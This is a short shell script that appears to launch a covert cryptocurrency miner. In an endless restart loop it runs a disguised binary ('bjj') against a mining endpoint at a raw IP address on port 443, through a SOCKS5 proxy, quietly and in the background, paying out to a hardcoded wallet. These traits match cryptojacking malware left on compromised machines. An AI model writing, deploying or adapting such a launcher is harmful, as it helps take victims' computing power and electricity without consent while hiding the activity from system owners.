#!/bin/sh
while [ 1 ]; do
./bjj -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-asc) -p c=CRNC,mc=VHH  --proxy=socks5://192.252.209.155:14455 -t2 -q -S -B
sleep 5
done
